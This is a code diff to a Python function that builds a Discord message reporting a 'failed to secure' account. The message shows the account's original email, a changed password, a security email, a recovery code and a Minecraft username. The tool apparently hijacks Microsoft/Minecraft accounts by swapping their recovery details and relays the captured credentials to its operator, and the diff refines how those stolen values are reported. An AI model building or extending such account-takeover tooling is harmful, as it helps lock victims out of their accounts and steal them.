@@ -59,7 +59,14 @@ def add_credential_line_field(
     return embed
 
 
-def build_failure_embed(email: str, ms: dict, reason: str, *, error: str | None = None) -> Embed:
+def build_failure_embed(
+    email: str,
+    ms: dict,
+    reason: str,
+    *,
+    error: str | None = None,
+    credentials_changed: bool = False,
+) -> Embed:
     detail = error or reason
     embed = Embed(
         title="Failed to secure account",
@@ -68,21 +75,30 @@ def build_failure_embed(email: str, ms: dict, reason: str, *, error: str | None 
     )
     embed.add_field(name="Error", value=f"```{detail[:1000]}```", inline=False)
     embed.add_field(name="Original Email", value=f"```{email}```", inline=False)
-    if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
-        embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
-    if ms.get("password") and ms["password"] != "Couldn't Change!":
-        embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
-    if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
-        embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
-    add_credential_line_field(
-        embed,
-        email=email,
-        recovery=ms.get("recovery_code", ""),
-        password=ms.get("password", ""),
-        security_email=ms.get("security_email", ""),
-        username=ms.get("username") or ms.get("mc_name") or "",
-    )
-    embed.set_footer(text="Save these credentials — the password may already have been changed.")
+    if credentials_changed:
+        if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
+            embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
+        if ms.get("password") and ms["password"] != "Couldn't Change!":
+            embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
+        if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
+            embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
+        add_credential_line_field(
+            embed,
+            email=email,
+            recovery=ms.get("recovery_code", ""),
+            password=ms.get("password", ""),
+            security_email=ms.get("security_email", ""),
+            username=ms.get("username") or ms.get("mc_name") or "",
+        )
+        embed.set_footer(text="Save these credentials — the password was already changed.")
+    else:
+        if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
+            embed.add_field(
+                name="Original Recovery Code",
+                value=f"```{ms['recovery_code']}```",
+                inline=False,
+            )
+        embed.set_footer(text="Credentials were NOT changed — original recovery code should still work.")
     return embed
 
 
